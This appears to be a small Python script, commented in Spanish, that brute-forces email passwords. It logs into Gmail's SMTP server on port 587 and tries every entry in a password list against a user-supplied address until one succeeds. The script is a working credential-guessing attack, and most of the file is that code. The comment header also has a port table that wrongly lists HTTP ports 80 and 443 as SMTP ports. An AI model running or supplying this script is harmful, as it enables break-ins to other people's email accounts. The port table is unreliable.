'''
Para más info: https://www.akamai.com/es/glossary/what-is-brute-force-attack
Ataque basándonos en un diccionario (típico) de passwords... El funcionamiento es idéntico
al que tenemos en las películas de robos, se intenta "inyectar" el password variándolo según
las necesidades:
    - Diccionario: se recorre un txt de principio a fin en cada posición del password, es decir,
    consideramos al password como un array, por lo que hacemos comprobación diccionario - posición
    de forma continua
    - Sencillo: se recorre un txt de principio a fin y lo comparamos con el password

Tabla de puertos para SMTP:

    PUERTO      FINALIDAD                                   SSL/TLS
    - 25        protocolo simple de transferencia (email)   Opcional
    - 587/588   envío de mensajes                           Opcional
    - 465       SMTP autenticado por SSL                    Sí, dispone de cifrado
    - 80        protocolo de transferencia hipertexto       Opcional
    - 443       protocolo de transferencia hipert. seguro   Sí, dispone de cifrado SSL
    - 2525      puerto alternativo de comunicación          Opcional
'''

#IMPORTS
import smtplib # cliente SMTP - https://docs.python.org/es/3/library/smtplib.html

#CONFIG
smtpServer = smtplib.SMTP("smtp.gmail.com", 587) # llamada a URL del server y puerto determinado
smtpServer.ehlo() # EHLO: para abrir una sesión
smtpServer.starttls() # iniciamos la comunicación cifrada

#MAIN
usuario = input("Introduce email: ") # credencial de usuario
passwFile = open("passwordList.txt","r")# apertura de diccionario con passwords (posibles)

for password in passwFile:
    password = password.strip('\n') # en el archivo tenemos todos los pass, separados por INTRO o salto de línea

    try:
        smtpServer.login(usuario, password)
        print(f"[++++] Password encontrado: {password} [++++]")

    except smtplib.SMTPAuthenticationError: # Excepción de autenticación - Error al autenticar
        print(f"[-] Password no coincidente - Utilizado: {password}")